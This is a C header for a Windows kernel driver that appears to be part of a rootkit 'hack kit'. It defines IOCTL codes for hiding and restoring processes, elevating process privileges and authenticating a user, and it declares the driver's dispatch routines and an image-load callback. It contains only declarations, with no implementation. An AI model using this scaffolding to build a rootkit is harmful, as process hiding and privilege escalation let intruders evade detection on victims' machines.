#ifndef _lhkdrv_h_
#define _lhkdrv_h_

/*FILE_DEVICE_HACKKIT I/O*/
#define FILE_DEVICE_HACKKIT 64715
#define IOCTL_AUTHUSER CTL_CODE(FILE_DEVICE_HACKKIT, 3000, METHOD_NEITHER, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_KITBRKCONT CTL_CODE(FILE_DEVICE_HACKKIT, 2999, METHOD_NEITHER, FILE_READ_DATA|FILE_WRITE_DATA)

#define IOCTL_CURRPROCNAME CTL_CODE(FILE_DEVICE_HACKKIT, 2048, METHOD_NEITHER, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_HIDEPROC CTL_CODE(FILE_DEVICE_HACKKIT, 2049, METHOD_NEITHER, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_RESTOREPROC CTL_CODE(FILE_DEVICE_HACKKIT, 2050, METHOD_NEITHER, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_ELEVATEPROC CTL_CODE(FILE_DEVICE_HACKKIT, 2051, METHOD_NEITHER, FILE_READ_DATA|FILE_WRITE_DATA)

#ifndef _WIN32_WINNT     
#define _WIN32_WINNT 0x0501
#endif

#ifdef __cplusplus
extern "C" 
{
#endif
#include <ntddk.h>
#include <ntddstor.h>
#include <mountdev.h>
#include <ntddvol.h>
#ifdef __cplusplus
}
#endif

#include "helpers.h"
#include "kitapi.h"


void LHKdrvUnload(IN PDRIVER_OBJECT DriverObject);
NTSTATUS LHKdrvDefaultHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS LHKdrvCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS LHKdrvClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS LHKdrvRead(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS LHKdrvWrite(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS LHKdrvIoctl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);

#ifdef __cplusplus
extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath);
#endif

VOID ImageLoadNotifyCallback(IN PUNICODE_STRING FullImageName,
	IN HANDLE ProcessId, IN PIMAGE_INFO ImageInfo);

#endif //_lhkdrv_h_
